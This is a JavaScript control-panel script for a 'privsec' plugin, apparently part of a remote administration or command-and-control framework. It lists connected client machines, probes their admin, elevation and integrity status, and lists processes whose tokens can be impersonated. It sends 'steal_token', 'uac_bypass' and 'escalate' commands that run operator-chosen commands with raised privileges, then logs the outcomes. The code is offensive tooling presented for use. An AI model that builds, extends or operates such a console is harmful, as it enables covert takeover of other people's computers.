const PLUGIN_ID = "privsec";

let currentClientId = "";

const $ = (id) => document.getElementById(id);

async function rpc(method, params = {}) {
  const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ method, params }),
  });
  const body = await res.json().catch(() => ({}));
  if (!body.ok) throw new Error(body.error || `rpc ${method} failed: ${res.status}`);
  return body.result;
}

async function sendEvent(event, payload = {}) {
  if (!currentClientId) {
    log("no client id set", "err");
    return;
  }
  await fetch(`/api/clients/${currentClientId}/plugins/${PLUGIN_ID}/event`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event, payload }),
  });
}

function setBadge(state) {
  const b = $("statusBadge");
  b.className = "badge " + (state || "idle");
  b.textContent = state || "idle";
}

function log(text, kind = "") {
  const el = $("log");
  const line = document.createElement("div");
  line.className = "line" + (kind ? " " + kind : "");
  const ts = document.createElement("span");
  ts.className = "ts";
  ts.textContent = new Date().toLocaleTimeString();
  line.appendChild(ts);
  line.appendChild(document.createTextNode(text));
  el.appendChild(line);
  while (el.children.length > 200) el.removeChild(el.firstChild);
  el.scrollTop = el.scrollHeight;
}

function collectSettings() {
  return {
    bypassMethod: $("bypassMethod").value,
    command: $("uacCommand").value.trim(),
    targetPid: parseInt($("targetPid").value, 10) || 0,
    targetProcess: $("tokenCommand").value.trim(),
  };
}

function renderPosture(p) {
  const el = $("posture");
  if (!p) {
    el.className = "info empty";
    el.textContent = "not probed — run recon";
    return;
  }
  el.className = "info";
  el.innerHTML = "";

  const add = (k, v, cls) => {
    const d = document.createElement("div");
    d.innerHTML = `<span class="k">${k}:</span> <span class="${cls || "v"}"></span>`;
    d.querySelector("span:last-child").textContent = v;
    el.appendChild(d);
  };

  add("user", p.user || "-");
  add("admin", p.admin ? "yes" : "no", p.admin ? "ok" : "bad");
  add("elevated", p.elevated ? "yes" : "no", p.elevated ? "ok" : "bad");
  add("integrity", p.integrity || "-", p.integrity === "System" || p.integrity === "High" ? "ok" : "v");
  add("uac consent", p.uac >= 0 ? String(p.uac) : "unknown");

  if ((p.useful || []).length) {
    const d = document.createElement("div");
    d.innerHTML = `<span class="k">useful privileges:</span>`;
    el.appendChild(d);
    const wrap = document.createElement("div");
    (p.useful || []).forEach((u) => {
      const s = document.createElement("span");
      s.className = "priv-tag hot";
      s.textContent = u.split(" — ")[0];
      s.title = u;
      wrap.appendChild(s);
    });
    el.appendChild(wrap);
  }
}

function renderAdvice(list) {
  const el = $("advice");
  el.innerHTML = "";
  if (!list.length) {
    el.className = "advice empty";
    el.textContent = "run recon to get a recommendation";
    return;
  }
  el.className = "advice";
  list.forEach((a) => {
    const d = document.createElement("div");
    d.className = "tip";
    d.textContent = a;
    el.appendChild(d);
  });
}

function renderTokens(list) {
  $("tokCount").textContent = list.length;
  const body = $("tokBody");
  body.innerHTML = "";
  if (!list.length) {
    $("tokEmpty").style.display = "block";
    return;
  }
  $("tokEmpty").style.display = "none";
  list.forEach((t) => {
    const tr = document.createElement("tr");

    const pid = document.createElement("td");
    pid.className = "pid";
    pid.textContent = t.pid;
    pid.title = "click to target this pid";
    pid.onclick = () => { $("targetPid").value = t.pid; };

    const name = document.createElement("td");
    name.textContent = t.name || "-";

    const act = document.createElement("td");
    const b = document.createElement("button");
    b.className = "btn ghost";
    b.textContent = "target";
    b.style.fontSize = "11px";
    b.style.padding = "4px 8px";
    b.onclick = () => { $("targetPid").value = t.pid; };
    act.appendChild(b);

    tr.appendChild(pid);
    tr.appendChild(name);
    tr.appendChild(act);
    body.appendChild(tr);
  });
}

function renderEscalations(list) {
  $("escCount").textContent = list.length;
  const body = $("escBody");
  body.innerHTML = "";
  if (!list.length) {
    $("escEmpty").style.display = "block";
    return;
  }
  $("escEmpty").style.display = "none";
  list.forEach((e) => {
    const tr = document.createElement("tr");

    const t = document.createElement("td");
    t.className = "tech";
    t.textContent = e.technique;

    const r = document.createElement("td");
    const s = document.createElement("span");
    s.className = "res " + (e.ok ? "ok" : "fail");
    s.textContent = e.ok ? "ok" : "failed";
    r.appendChild(s);

    const d = document.createElement("td");
    d.className = "detail";
    d.textContent = e.detail || "";

    tr.appendChild(t);
    tr.appendChild(r);
    tr.appendChild(d);
    body.appendChild(tr);
  });
}

function handleStream(data) {
  if (!data) return;
  const evt = data.event;
  const p = data.payload ?? data;
  if (p && p.clientId && p.clientId !== currentClientId) return;

  switch (evt) {
    case "status":
      setBadge(p.state);
      if (p.detail) log(p.detail, p.state === "done" ? "ok" : "");
      break;
    case "priv":
      renderPosture(p);
      log(`admin=${p.admin} elevated=${p.elevated} integrity=${p.integrity}`, "ok");
      loadAdvice();
      break;
    case "tokens":
      renderTokens(p.tokens || []);
      log(`${(p.tokens || []).length} impersonation target(s)`, "ok");
      break;
    case "token":
      loadEscalations();
      if (p.ok) log(`TOKEN: ${p.mode} from pid ${p.pid} — ${p.detail}`, "ok");
      else log(`token theft failed: ${p.detail}`, "err");
      break;
    case "uac_bypass":
      loadEscalations();
      log(p.ok ? `UAC bypass via ${p.method}` : `bypass failed: ${p.reason}`, p.ok ? "ok" : "err");
      break;
    case "uac":
      log(`UAC enabled=${p.enabled} level=${p.consentLevel} — ${p.note}`, "warn");
      break;
    case "attempt":
      log(`path: ${p.technique} — ${p.detail}`, "warn");
      break;
    case "escalated":
      loadEscalations();
      log(p.ok ? `escalated via ${p.method}` : "no automatic escalation", p.ok ? "ok" : "warn");
      break;
    case "exec":
      log(`executed as ${p.as}: ${p.command}`, "ok");
      break;
    case "error":
      log(p.message || "error", "err");
      break;
    default:
      break;
  }
}

function connectStream() {
  const es = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
  ["status", "priv", "tokens", "token", "uac_bypass", "uac", "attempt",
   "escalated", "exec", "error", "pong"].forEach((ch) => {
    es.addEventListener(ch, (ev) => {
      let data;
      try { data = JSON.parse(ev.data); } catch { data = null; }
      if (data != null) handleStream({ event: ch, payload: data });
    });
  });
  es.onerror = () => {
    es.close();
    setTimeout(connectStream, 3000);
  };
}

async function loadPosture() {
  if (!currentClientId) return;
  try { renderPosture(await rpc("get_posture", { clientId: currentClientId })); } catch (e) {}
}

async function loadAdvice() {
  if (!currentClientId) return;
  try {
    const res = await rpc("advise", { clientId: currentClientId });
    renderAdvice(res.advice || []);
  } catch (e) {}
}

async function loadTokens() {
  if (!currentClientId) return;
  try { renderTokens(await rpc("list_tokens", { clientId: currentClientId })); } catch (e) {}
}

async function loadEscalations() {
  if (!currentClientId) return;
  try { renderEscalations(await rpc("list_escalations", { clientId: currentClientId })); } catch (e) {}
}

async function loadConfig() {
  if (!currentClientId) return;
  try {
    const cfg = await rpc("get_config", { clientId: currentClientId });
    if (cfg.bypassMethod) $("bypassMethod").value = cfg.bypassMethod;
    if (cfg.command) $("uacCommand").value = cfg.command;
  } catch (e) {}
}

async function refreshClients() {
  try {
    const clients = await rpc("list_clients");
    const dl = $("clientsList");
    dl.innerHTML = "";
    clients.forEach((c) => {
      const o = document.createElement("option");
      o.value = c.clientId;
      dl.appendChild(o);
    });
    $("clientCount").textContent =
      clients.length ? `${clients.length} client(s) seen` : "no clients seen yet";
    if (clients.length && !currentClientId) {
      currentClientId = clients[0].clientId;
      $("clientId").value = currentClientId;
      loadConfig(); loadPosture(); loadAdvice(); loadTokens(); loadEscalations();
    }
  } catch (e) {}
}

async function save() {
  try { await rpc("save_config", { clientId: currentClientId, config: collectSettings() }); } catch (e) {}
}

function bind() {
  $("clientId").addEventListener("change", (e) => {
    currentClientId = e.target.value.trim();
    loadConfig(); loadPosture(); loadAdvice(); loadTokens(); loadEscalations();
  });

  $("refreshClients").addEventListener("click", refreshClients);

  $("recon").addEventListener("click", () => { setBadge("working"); sendEvent("recon"); });
  $("checkUac").addEventListener("click", () => sendEvent("check_uac"));
  $("listTokens").addEventListener("click", () => sendEvent("tokens"));

  $("stealToken").addEventListener("click", async () => {
    await save();
    const pid = parseInt($("targetPid").value, 10);
    if (!pid) {
      log("pick a pid from the list first", "err");
      return;
    }
    setBadge("working");
    sendEvent("steal_token", {
      targetPid: pid,
      command: $("tokenCommand").value.trim(),
    });
  });

  $("uacBypass").addEventListener("click", async () => {
    await save();
    setBadge("working");
    sendEvent("uac_bypass", collectSettings());
  });

  $("escalate").addEventListener("click", async () => {
    await save();
    setBadge("working");
    sendEvent("escalate", collectSettings());
  });
}

bind();
connectStream();
loadConfig(); loadPosture(); loadAdvice(); loadTokens(); loadEscalations();
refreshClients();
